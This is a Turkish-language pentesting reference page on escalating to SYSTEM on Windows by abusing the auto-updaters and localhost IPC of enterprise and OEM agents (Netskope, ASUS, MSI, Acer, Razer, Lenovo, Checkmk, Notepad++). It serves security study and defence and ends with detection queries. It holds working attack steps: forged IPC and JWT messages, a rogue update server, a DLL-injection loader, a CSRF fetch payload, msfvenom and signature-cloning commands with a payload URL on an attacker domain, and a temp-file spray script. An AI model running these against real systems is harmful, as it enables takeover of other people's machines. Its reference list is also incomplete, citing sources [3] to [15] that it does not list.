# Enterprise Auto-Updaters ve Privileged IPC'yi Kötüye Kullanma (örn. Netskope, ASUS ve MSI)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, enterprise endpoint agent'larında ve low-friction bir IPC surface ile privileged bir update flow sunan updater'larda bulunan bir Windows local privilege escalation chain sınıfını genelleştirir. Temsili bir örnek, düşük yetkili bir kullanıcının enrollment işlemini attacker-controlled bir server'a yönlendirebildiği ve ardından SYSTEM service'ın yüklediği malicious bir MSI gönderebildiği Netskope Client for Windows < R129 (CVE-2025-0309) örneğidir.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Benzer ürünlere karşı yeniden kullanabileceğiniz temel fikirler:
- Re-enrollment veya reconfiguration işlemini attacker server'a zorlamak için privileged service'ın localhost IPC'sini abuse edin.
- Vendor'ın update endpoint'lerini implement edin, rogue Trusted Root CA gönderin ve updater'ı malicious, “signed” bir package'a yönlendirin.
- Weak signer check'leri (CN allow-list'leri), optional digest flag'lerini ve lax MSI property'lerini bypass edin.
- IPC “encrypted” ise registry'de world-readable olarak saklanan machine identifier'lardan key/IV türetin.
- Service, caller'ları image path/process name ile kısıtlıyorsa allow-listed bir process'e inject edin veya bir process'i suspended olarak spawn edip minimal bir thread-context patch aracılığıyla DLL'inizi bootstrap edin.

---
## 1) Localhost IPC üzerinden enrollment işlemini attacker server'a zorlama

Birçok agent, localhost TCP üzerinden bir SYSTEM service ile iletişim kuran user-mode bir UI process'iyle birlikte gelir.

Netskope'da gözlemlenenler:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Backend host'u kontrol eden claim'lere (örn. AddonUrl) sahip bir JWT enrollment token oluşturun. İmza gerekmemesi için alg=None kullanın.
2) Provisioning command'ı JWT'niz ve tenant name'iniz ile çağıran IPC message'ını gönderin:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Service enrollment/config için rogue server'ınıza istek göndermeye başlar, örneğin:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notlar:
- Caller verification path/name tabanlıysa isteği allow-list'e alınmış bir vendor binary'sinden başlatın (bkz. §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) SYSTEM olarak code çalıştırmak için update channel'ı ele geçirme

Client server'ınızla iletişim kurduktan sonra beklenen endpoint'leri uygulayın ve onu bir attacker MSI'ına yönlendirin. Tipik sequence:

1) /v2/config/org/clientconfig → Çok kısa bir updater interval'ı içeren JSON config döndürün, örn.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Bir PEM CA certificate döndürür. Service bunu Local Machine Trusted Root store'a yükler.
3) /v2/checkupdate → Malicious MSI ve sahte bir version'a işaret eden metadata sağlayın.

Sahada sık görülen kontrolleri bypass etme:
- Signer CN allow-list: service yalnızca Subject CN'in “netSkope Inc” veya “Netskope, Inc.” değerine eşit olup olmadığını kontrol edebilir. Rogue CA'niz bu CN'e sahip bir leaf oluşturabilir ve MSI'yi imzalayabilir.
- CERT_DIGEST property: CERT_DIGEST adlı benign bir MSI property'si ekleyin. Install sırasında enforcement yoktur.
- Optional digest enforcement: config flag (ör. check_msi_digest=false) ek cryptographic validation'ı devre dışı bırakır.

Sonuç: SYSTEM service, MSI'nizi şu konumdan yükleyerek
C:\ProgramData\Netskope\stAgent\data\*.msi
NT AUTHORITY\SYSTEM olarak arbitrary code çalıştırır.<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass dersi: vendor, update source'u cryptographically authenticate etmek yerine küçük bir “trusted” domain set'ini allow-list'e alarak yanıt verirse, trafiği yönlendirmenize hâlâ izin veren vendor-owned redirector'ları veya reverse proxy'leri arayın. Netskope örneğinde public follow-up research, R129-era allow-list'in attacker-controlled Azure App Service içeriğini proxy'leyen `rproxy.goskope.com` üzerinden hâlâ abuse edilebildiğini gösterdi. Hostname allow-list'lerini bir trust boundary değil, aşılması gereken bir engel olarak değerlendirin.<sup>[[14]](#references)</sup>

---
## 3) Encrypted IPC request'leri forge etme (mevcut olduğunda)

R127'den itibaren Netskope, IPC JSON'ını Base64'e benzeyen bir encryptData field'ı içinde sarmaladı. Reversing sonucunda, key/IV'nin herhangi bir user tarafından okunabilen registry değerlerinden türetilen AES kullandığı görüldü:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers, encryption'ı yeniden uygulayabilir ve standard user üzerinden geçerli encrypted command'ler gönderebilir.<sup>[[1]](#references)[[2]](#references)</sup> Genel ipucu: bir agent IPC'sini aniden “encrypt” etmeye başlarsa, HKLM altında material olarak kullanılan device ID'leri, product GUID'lerini ve install ID'lerini arayın.

---
## 4) IPC caller allow-list'lerini bypass etme (path/name kontrolleri)

Bazı service'ler peer'i, TCP connection'ın PID'sini çözümleyip image path/name değerini Program Files altında bulunan allow-listed vendor binary'leriyle (ör. stagentui.exe, bwansvc.exe, epdlp.exe) karşılaştırarak authenticate etmeye çalışır.

İki pratik bypass:
- Allow-listed bir process'e (ör. nsdiag.exe) DLL injection yapıp IPC'yi onun içinden proxy'lemek.
- Allow-listed bir binary'yi suspended olarak başlatmak ve driver-enforced tamper kurallarını karşılamak için CreateRemoteThread kullanmadan proxy DLL'inizi bootstrap etmek (bkz. §5).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection dostu injection: suspended process + NtContinue patch

Ürünler genellikle protected process'lere ait handle'larda tehlikeli hakları kaldırmak için bir minifilter/OB callbacks driver'ı (ör. Stadrv) birlikte gönderir:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME haklarını kaldırır
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE ile sınırlar

Bu kısıtlamalara uyan güvenilir bir user-mode loader:
1) CREATE_SUSPENDED ile bir vendor binary'si için CreateProcess çağırın.
2) Hâlâ izin verilen handle'ları alın: process üzerinde PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve THREAD_GET_CONTEXT/THREAD_SET_CONTEXT haklarına sahip bir thread handle'ı (veya known RIP'te code patch'liyorsanız yalnızca THREAD_RESUME).
3) ntdll!NtContinue'ı (veya erkenden ve garanti olarak map edilmiş başka bir thunk'ı), DLL path'inizde LoadLibraryW çağıran ve ardından geri atlayan küçük bir stub ile overwrite edin.
4) Stub'ı in-process tetikleyerek DLL'inizi yüklemek için ResumeThread çağırın.

Zaten protected olan bir process üzerinde PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadığınız için (process'i siz oluşturdunuz), driver policy'si karşılanır.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Pratik tooling
- NachoVPN (Netskope plugin), rogue CA oluşturma, malicious MSI signing ve gerekli endpoint'leri sunma işlemlerini otomatikleştirir: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope, arbitrary (isteğe bağlı olarak AES-encrypted) IPC message'ları oluşturan custom bir IPC client'ıdır ve allow-listed bir binary'den kaynaklanmak için suspended-process injection'ını içerir.<sup>[[4]](#references)</sup>

## 7) Bilinmeyen updater/IPC surface'leri için hızlı triage workflow'u

Yeni bir endpoint agent veya motherboard “helper” suite ile karşılaştığınızda, promising bir privesc target'ına bakıp bakmadığınızı anlamak için genellikle hızlı bir workflow yeterlidir:<sup>[[6]](#references)</sup>

1) Loopback listener'larını enumerate edin ve bunları vendor process'lerine geri eşleyin:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Aday named pipe'ları listeleyin:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Plugin-based IPC sunucuları tarafından kullanılan Registry destekli routing verilerini çıkar:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Önce user-mode client'tan endpoint adlarını, JSON key'lerini ve command ID'lerini çıkarın. Packed Electron/.NET frontend'leri sıklıkla tüm schema'yı leak eder:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Yalnızca sonunda process'i başlatan kod yolunu değil, gerçek güven koşulunu araştırın:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Öncelik vermeye değer pattern'ler:
- `CryptQueryObject`/certificate parsing işleminin `WinVerifyTrust` olmadan yapılması genellikle “certificate exists” ifadesinin “certificate is trusted” olarak kabul edildiği anlamına gelir; bu da certificate cloning veya diğer fake-signer trick'lerini mümkün kılar.
- `Origin`, `Referer`, download URL'leri, process name'leri veya signer CN'leri üzerinde substring/suffix kontrolleri authentication değildir. `contains(".vendor.com")` kontrolleri, attacker-controlled lookalike domain'lerle genellikle exploit edilebilir.
- Low-privileged GUI “the file is trusted” kararını veriyor ve SYSTEM broker yalnızca bu sonucu kullanıyorsa, client-side DLL/JS'yi patch'lemek veya yeniden uygulamak boundary'yi tamamen bypass edebilir (Razer-style split validation).
- Broker bir payload'ı `%TEMP%`/`C:\Windows\Temp` konumuna kopyalıyor ve ardından bu path üzerinden validate ediyor veya schedule ediyorsa, hemen TOCTOU replacement window'larını ve daha zayıf kontroller sunan alternatif `ExecuteTask()` wrapper'larına sahip sibling plugin module'lerini test edin.<sup>[[6]](#references)</sup>

Named-pipe ağırlıklı target'lar için PipeViewer, protocol'ü derinlemesine reverse etmeye başlamadan önce zayıf DACL'leri ve remotely reachable pipe'ları hızlıca tespit etmenin iyi bir yoludur.<sup>[[11]](#references)</sup>

Target yalnızca PID, image path veya process name kullanarak caller'ları authenticate ediyorsa, bunu boundary yerine bir speed bump olarak değerlendirin: legitimate client içine injecting yapmak veya bağlantıyı allow-listed bir process'ten kurmak, server'ın kontrollerini geçmek için çoğu zaman yeterlidir. Named pipe'lar özelinde, [client impersonation ve pipe abuse hakkındaki bu sayfa](named-pipe-client-impersonation.md) primitive'i daha ayrıntılı şekilde ele alır.

---
## 8) Yalnızca vendor signature'larıyla authenticate edilen modular add-in broker'ları (Lenovo Vantage pattern'i)

Araştırmaya değer daha yeni bir varyasyon **signed-client RPC broker**'ıdır: low-privileged, Lenovo-signed bir desktop process SYSTEM service ile iletişim kurar ve service, JSON command'larını `%ProgramData%` altındaki XML-described add-in setine yönlendirir. **Herhangi bir kabul edilen signed client içinde** code execution elde edildiğinde, her `runas="system"` contract'ı attack surface'inizin bir parçası haline gelir.<sup>[[15]](#references)</sup>

Lenovo Vantage araştırmasında gözlemlenen high-value primitive'ler:
- **Caller'ın vendor tarafından signed olduğu için trusted kabul edilmesi**: Researchers, Lenovo-signed bir EXE'yi writable bir directory'ye kopyalayıp bir DLL side-load (`profapi.dll`) koşulunu sağlayarak authenticated bir context'e ulaştı; bunun sonucunda service'in zaten trusted kabul ettiği bir client içinde arbitrary code çalıştı.
- **Manifest-driven attack surface discovery**: Add-in'ler `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` altında tanımlanır; çeşitli contract'lar `SYSTEM` olarak çalışır. Bu nedenle manifest'leri enumerate etmek, gerçek privileged verb'leri çoğu zaman broker'ın kendisini reverse etmekten daha hızlı ortaya çıkarır.
- **Authenticated channel arkasındaki per-command bug'lar**: Trusted client içine girdikten sonra public research, update/install verb'lerinde path-traversal + race condition'lar, privileged settings database'lerinde raw-SQL abuse ve hedeflenen hive'ın dışına write edilmesini sağlayan substring-based registry path check'leri ortaya çıkardı.

Bir target üzerindeki useful recon:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Pratik çıkarım: Bir helper suite önce **caller process**'i authenticate eden ve ancak bundan sonra onlarca plugin/add-in komutuna dispatch yapan bir broker sunuyorsa, front-door trust check'i bypass ettikten sonra durmayın. Manifest/contract table'ı dump edin ve her high-privilege verb'i bağımsız olarak fuzz edin; authenticated channel genellikle birkaç second-stage bug'ı gizler.

---
## 1) Privileged HTTP API'lere karşı Browser-to-localhost CSRF (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 üzerinde, browser çağrılarının https://driverhub.asus.com adresinden geldiğini varsayan user-mode bir HTTP service (ADU.exe) sunar. Origin filter, Origin header'ı ve `/asus/v1.0/*` tarafından sunulan download URL'leri üzerinde yalnızca `string_contains(".asus.com")` işlemini gerçekleştirir. Bu nedenle `https://driverhub.asus.com.attacker.tld` gibi attacker-controlled herhangi bir host check'i geçer ve JavaScript üzerinden state-changing request'ler gönderebilir.<sup>[[6]](#references)</sup> Ek bypass pattern'leri için [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) bölümüne bakın.

Pratik akış:
1) `.asus.com` içeren bir domain register edin ve burada malicious bir webpage host edin.
2) `http://127.0.0.1:53000` üzerindeki privileged bir endpoint'i (ör. `Reboot`, `UpdateApp`) çağırmak için `fetch` veya XHR kullanın.
3) Handler'ın beklediği JSON body'yi gönderin – packed frontend JS aşağıdaki schema'yı gösterir.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Aşağıda gösterilen PowerShell CLI, Origin header'ı güvenilen değerle spoof edildiğinde bile başarılı olur:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Saldırgan sitesine yapılan herhangi bir tarayıcı ziyareti, bu nedenle SYSTEM helper’ını çalıştıran 1-click (veya `onload` aracılığıyla 0-click) yerel bir CSRF’e dönüşür.

---
## 2) Güvensiz code-signing doğrulaması ve certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`, JSON body içinde tanımlanan rastgele executable’ları indirir ve bunları `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` konumunda cache’ler. Download URL validation aynı substring mantığını yeniden kullandığından `http://updates.asus.com.attacker.tld:8000/payload.exe` kabul edilir. İndirme sonrasında ADU.exe yalnızca PE’nin bir signature içerip içermediğini ve Subject string’inin ASUS ile eşleşip eşleşmediğini kontrol eder, ardından executable’ı çalıştırır; `WinVerifyTrust` veya chain validation yapılmaz.

Bu flow’u weaponize etmek için:
1) Bir payload oluşturun (ör. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS signer’ını payload’a clone edin (ör. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) ` .asus.com` benzeri bir domain üzerinde `pwn.exe` barındırın ve yukarıdaki browser CSRF aracılığıyla UpdateApp’i tetikleyin.

Hem Origin hem de URL filter’ları substring tabanlı olduğundan ve signer check yalnızca string’leri karşılaştırdığından DriverHub, saldırgan binary’sini elevated context altında indirip çalıştırır.<sup>[[6]](#references)</sup>

---
## 1) Updater copy/execute path’leri içinde TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center’ın SYSTEM service’i, her frame’in `4-byte ComponentID || 8-byte CommandID || ASCII arguments` biçiminde olduğu bir TCP protocol sunar. Core component (Component ID `0f 27 00 00`), `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` komutunu içerir. Handler şu işlemleri yapar:
1) Sağlanan executable’ı `C:\Windows\Temp\MSI Center SDK.exe` konumuna kopyalar.
2) Signature’ı `CS_CommonAPI.EX_CA::Verify` aracılığıyla doğrular (certificate subject “MICRO-STAR INTERNATIONAL CO., LTD.” ile eşleşmeli ve `WinVerifyTrust` başarılı olmalıdır).
3) Temp file’ı attacker-controlled arguments ile SYSTEM olarak çalıştıran bir scheduled task oluşturur.

Kopyalanan file, verification ile `ExecuteTask()` arasında lock’lanmaz. Saldırgan şunları yapabilir:
- Signature check’in geçmesini ve task’ın queue’ya alınmasını garanti etmek için, meşru MSI-signed bir binary’ye işaret eden Frame A’yı gönderir.
- Verification tamamlandıktan hemen sonra `MSI Center SDK.exe`’yi overwrite eden ve malicious payload’a işaret eden tekrarlı Frame B mesajlarıyla yarışır.

Scheduler tetiklendiğinde, original file doğrulanmış olmasına rağmen overwrite edilmiş payload’ı SYSTEM altında çalıştırır. Güvenilir exploitation, TOCTOU window’unu kazanılana kadar CMD_AutoUpdateSDK’ye spam gönderen iki goroutine/thread kullanır.<sup>[[6]](#references)</sup>

---
## 2) Custom SYSTEM-level IPC ve impersonation abuse’u (MSI Center + Acer Control Centre)

### MSI Center TCP command set’leri
- `MSI.CentralServer.exe` tarafından yüklenen her plugin/DLL, `HKLM\SOFTWARE\MSI\MSI_CentralServer` altında saklanan bir Component ID alır. Bir frame’in ilk 4 byte’ı bu component’i seçer ve saldırganların command’leri rastgele modüllere yönlendirmesine olanak tanır.
- Plugin’ler kendi task runner’larını tanımlayabilir. `Support\API_Support.dll`, `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` komutunu sunar ve `API_Support.EX_Task::ExecuteTask()` fonksiyonunu **signature validation olmadan** doğrudan çağırır – herhangi bir local user, bunu `C:\Users\<user>\Desktop\payload.exe` konumuna yönlendirerek deterministik şekilde SYSTEM execution elde edebilir.
- Loopback’i Wireshark ile sniff etmek veya .NET binary’lerini dnSpy’da instrument etmek, Component ↔ command mapping’ini hızlıca ortaya çıkarır; custom Go/Python client’lar daha sonra frame’leri replay edebilir.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipe’ları ve impersonation level’ları
- `ACCSvc.exe` (SYSTEM), `\\.\pipe\treadstone_service_LightMode` pipe’ını sunar ve discretionary ACL’si remote client’lara (ör. `\\TARGET\pipe\treadstone_service_LightMode`) izin verir. Bir file path ile command ID `7` gönderildiğinde service’in process-spawning routine’i çağrılır.
- Client library, args ile birlikte bir magic terminator byte’ı (113) serialize eder. Frida/`TsDotNetLib` ile yapılan dynamic instrumentation ([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) bölümündeki instrumentation ipuçlarına bakın), native handler’ın bu değeri `CreateProcessAsUser` çağrılmadan önce bir `SECURITY_IMPERSONATION_LEVEL` ve integrity SID değerine dönüştürdüğünü gösterir.
- 113 (`0x71`) değeri 114 (`0x72`) ile değiştirildiğinde, full SYSTEM token’ını koruyan ve high-integrity SID (`S-1-16-12288`) ayarlayan generic branch’e geçilir. Bu nedenle başlatılan binary, hem local hem de cross-machine olarak kısıtlanmamış SYSTEM şeklinde çalışır.
- Bunu exposed installer flag’i (`Setup.exe -nocheck`) ile birleştirerek, lab VM’lerinde bile ACC’yi çalıştırabilir ve vendor hardware olmadan pipe’ı test edebilirsiniz.<sup>[[6]](#references)</sup>

Bu IPC bug’ları, localhost service’lerinin neden mutual authentication (ALPC SID’leri, `ImpersonationLevel=Impersonation` filter’ları, token filtering) uygulaması gerektiğini ve her modülün “run arbitrary binary” helper’ının aynı signer verification’larını paylaşması gerektiğini gösterir.

---
## 3) Weak user-mode validation ile desteklenen COM/IPC “elevator” helper’ları (Razer Synapse 4)

Razer Synapse 4, bu family için başka bir kullanışlı pattern ekledi: low-privileged bir user, `RzUtility.Elevator` üzerinden bir process başlatması için COM helper’ından talepte bulunabilir; trust decision ise privileged boundary içinde robust şekilde uygulanmak yerine bir user-mode DLL’e (`simple_service.dll`) devredilir.

Gözlemlenen exploitation path’i:
- `RzUtility.Elevator` COM object’ini instantiate edin.
- Elevated launch talep etmek için `LaunchProcessNoWait(<path>, "", 1)` çağrısını yapın.
- Public PoC’te, request gönderilmeden önce `simple_service.dll` içindeki PE-signature gate patch’lenir; böylece saldırganın seçtiği arbitrary executable’ın başlatılmasına izin verilir.<sup>[[6]](#references)</sup>

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Genel çıkarım: “helper” suite’lerini reverse ederken localhost TCP veya named pipe’larla yetinmeyin. `Elevator`, `Launcher`, `Updater` veya `Utility` gibi adlara sahip COM class’larını kontrol edin; ardından privileged service’ın hedef binary’yi gerçekten doğrulayıp doğrulamadığını ya da yalnızca patch edilebilir bir user-mode client DLL tarafından hesaplanan sonuca güvenip güvenmediğini doğrulayın. Bu pattern Razer’ın ötesinde de geçerlidir: high-privilege broker’ın low-privilege taraftan gelen bir allow/deny kararını tükettiği her split design, olası bir privesc surface’idir.


---
## MSI repair sırasında öngörülebilir temp script çalıştırma (Checkmk Agent / CVE-2024-0670)

Bazı Windows agent’ları hâlâ privileged action’ları `C:\Windows\Temp` altında geçici bir `.cmd` oluşturarak ve bunu `SYSTEM` olarak çalıştırarak gerçekleştirir. Dosya adı öngörülebilir olduğunda ve service mevcut dosyaları güvenli şekilde yeniden oluşturmuyorsa, low-privileged bir kullanıcı gelecekte oluşturulacak temp dosyasını önceden **read-only** olarak oluşturabilir ve privileged process’in kendi script’i yerine attacker-controlled content çalıştırmasını sağlayabilir.

Vulnerable Checkmk Agent build’lerinde gözlemlenenler:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: cache’lenmiş agent package’ın MSI **repair** işlemi<sup>[[8]](#references)[[9]](#references)</sup>

Practical workflow:
1. Mevcut process ID’lerinden veya çalışan agent PID’sinden gerçekçi bir PID aralığı tahmin edin.
2. Kısa bir **ASCII** `.cmd` payload’ı yazın (`Set-Content -Encoding Ascii` veya `cmd.exe` redirection kullanın; batch file’lar için UTF-16 PowerShell output kullanmaktan kaçının).
3. `C:\Windows\Temp\cmk_all_<PID>_1.cmd` dosyasını aday aralık boyunca spray edin ve her dosyayı read-only olarak işaretleyin.
4. Privileged service’ın temp script’i yeniden oluşturmaya çalışmasını ve ardından çalıştırmasını sağlamak için cache’lenmiş MSI’ın repair işlemini tetikleyin.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Ürün Windows Installer ile kurulmuşsa, onarımı tetiklemeden önce `C:\Windows\Installer` altındaki rastgele görünümlü önbelleğe alınmış MSI'yi ürün adına eşleyin:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operasyonel notlar:
- `qwinsta`, `msiexec /fa` komutu etkileşimli olmayan bir WinRM shell'inden başarısız olduğunda ve mevcut bir masaüstü/bağlantısı kesilmiş session'ın repair işlemini doğru şekilde tetikleyip tetikleyemeyeceğini anlamanız gerektiğinde kullanışlıdır.<sup>[[7]](#references)</sup>
- Bu pattern, **world-writable konumlarda geçici script'ler stage eden ve daha sonra bunları SYSTEM olarak çalıştıran** diğer endpoint agent'ları ve updater'lara da genellenebilir. Öngörülebilir adları, exclusive create semantiğinin eksikliğini ve isteğe bağlı olarak tetiklenebilen repair/update flow'larını test edin.

---
## Zayıf updater validation üzerinden remote supply-chain hijacking (WinGUp / Notepad++)

Haziran 2025 ile Aralık 2025 arasında, Notepad++ update flow'unun arkasındaki hosting altyapısını compromise eden saldırganlar, seçilen victim'lara seçici olarak malicious manifest'ler sundu. Daha eski WinGUp tabanlı updater'lar update authenticity'yi tamamen doğrulamadığından, hostile bir XML response client'ları attacker-controlled URL'lere yönlendirebiliyordu. Client, indirilen installer için hem trusted certificate chain'i hem de geçerli bir PE signature'ı zorunlu kılmadan HTTPS içeriğini kabul ettiğinden victim'lar trojanized bir NSIS `update.exe` dosyası indirip çalıştırdı.<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow (local exploit gerekmez):
1. **Infrastructure interception**: CDN/hosting'i compromise edin ve update check'lerine malicious bir download URL'sini gösteren attacker metadata ile yanıt verin.
2. **Trojanized NSIS**: Installer bir payload indirir/çalıştırır ve iki execution chain'i abuse eder:
- **Bring-your-own signed binary + sideload**: İmzalı Bitdefender `BluetoothService.exe` dosyasını bundle edin ve search path'ine malicious bir `log.dll` bırakın. Signed binary çalıştığında Windows `log.dll` dosyasını sideload eder; bu DLL, Chrysalis backdoor'unu decrypt edip reflectively load eder (static detection'ı zorlaştırmak için Warbird-protected + API hashing kullanılır).
- **Scripted shellcode injection**: NSIS, shellcode inject etmek ve Cobalt Strike Beacon stage etmek için Win32 API'lerini (ör. `EnumWindowStationsW`) kullanan derlenmiş bir Lua script'i çalıştırır.<sup>[[12]](#references)</sup>

Her auto-updater için hardening/detection çıkarımları:
- İndirilen installer'ın **certificate + signature verification** işlemini zorunlu kılın (vendor signer'ı pin'leyin, eşleşmeyen CN/chain'i reddedin) ve update manifest'inin kendisini imzalayın (ör. XMLDSig). Manifest-controlled redirect'leri doğrulanmadıkları sürece block edin.
- **BYO signed binary sideloading**'i post-download detection pivot olarak ele alın: signed bir vendor EXE canonical install path dışından bir DLL adı yüklediğinde (ör. Bitdefender'ın Temp/Downloads içinden `log.dll` yüklemesi) ve bir updater temp içinden non-vendor signature'lara sahip installer'ları drop/execute ettiğinde alert üretin.
- Bu chain'de gözlemlenen malware-specific artifact'ları izleyin (generic pivot'lar olarak kullanışlıdır): `Global\Jdhfv_1.0.1` mutex'i, `%TEMP%` konumuna yapılan anomalous `gup.exe` write işlemleri ve Lua-driven shellcode injection stage'leri.
- Notepad++, v8.8.9 ve sonraki sürümlerde WinGUp'ı güçlendirerek yanıt verdi: döndürülen XML artık imzalıdır (XMLDSig) ve yeni build'ler yalnızca transport'a güvenmek yerine indirilen installer için certificate + signature verification uygular.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> bir Notepad++ olmayan yükleyiciyi başlatıyor</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Bu pattern'ler, unsigned manifest kabul eden veya installer signer'larını pin'lemeyen tüm updater'lar için genellenebilir: network hijack + malicious installer + BYO-signed sideloading, “trusted” update görünümü altında remote code execution sağlar.

---
## Referanslar
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
